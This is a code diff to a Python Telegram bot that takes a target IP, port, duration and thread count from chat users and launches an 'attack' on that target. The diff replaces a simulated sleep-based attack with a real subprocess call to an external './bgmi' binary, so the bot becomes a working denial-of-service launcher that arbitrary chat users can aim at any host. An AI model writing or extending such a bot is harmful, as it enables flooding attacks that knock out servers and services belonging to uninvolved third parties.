@@ -280,26 +280,26 @@ async def attack_start(update: Update, context: CallbackContext):
         return ConversationHandler.END  # Terminate the conversation
 
 # Function to handle the attack in a separate process
-def attack_process(chat_id, ip, port, duration, threads):
-    # Simulate the attack
-    time.sleep(duration)
+async def execute_bgmi(ip, port, duration, threads):
+    try:
+        # Execute the external binary with the provided arguments
+        process = await asyncio.create_subprocess_exec(
+            "./bgmi", ip, port, str(duration), str(threads),
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
 
-    # Notify the user that the attack is finished
-    asyncio.run(send_attack_finished_message(chat_id, ip, port, duration, threads))
+        # Wait for the process to complete
+        stdout, stderr = await process.communicate()
 
-# Function to send the attack finished message
-async def send_attack_finished_message(chat_id, ip, port, duration, threads):
-    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
-    await application.bot.send_message(
-        chat_id=chat_id,
-        text=f"✅ *Attack Finished!*\n🎯 *Target*: {ip}:{port}\n🕒 *Duration*: {duration} sec\n🧵 *Threads*: {threads}\n🔥 *The battlefield is now silent.*",
-        parse_mode='Markdown'
-    )
+        # Log the output (optional)
+        if stdout:
+            logging.info(f"stdout: {stdout.decode()}")
+        if stderr:
+            logging.error(f"stderr: {stderr.decode()}")
 
-# Function to write attack arguments to external file
-def write_attack_args_to_file(ip, port, duration, threads):
-    with open("./bgmi", "w") as file:
-        file.write(f"{ip} {port} {duration} {threads}\n")
+    except Exception as e:
+        logging.error(f"Error executing ./bgmi: {e}")
 
 # Attack Command - Handle Attack Input
 async def attack_input(update: Update, context: CallbackContext):
@@ -322,9 +322,6 @@ async def attack_input(update: Update, context: CallbackContext):
         await update.message.reply_text(f"❌ *Number of threads exceeds the max limit ({MAX_THREADS})!*", parse_mode='Markdown')
         return ConversationHandler.END  # Terminate the conversation
 
-    # Write attack arguments to external file
-    write_attack_args_to_file(ip, port, duration, threads)
-
     # Update the last attack time
     last_attack_time = time.time()
 
@@ -337,10 +334,8 @@ async def attack_input(update: Update, context: CallbackContext):
         parse_mode='Markdown'
     )
 
-    # Start the attack in a separate process
-    chat_id = update.effective_chat.id
-    process = multiprocessing.Process(target=attack_process, args=(chat_id, ip, port, duration, threads))
-    process.start()
+    # Execute the external binary with the provided arguments
+    await execute_bgmi(ip, port, duration, threads)
 
     return ConversationHandler.END
 
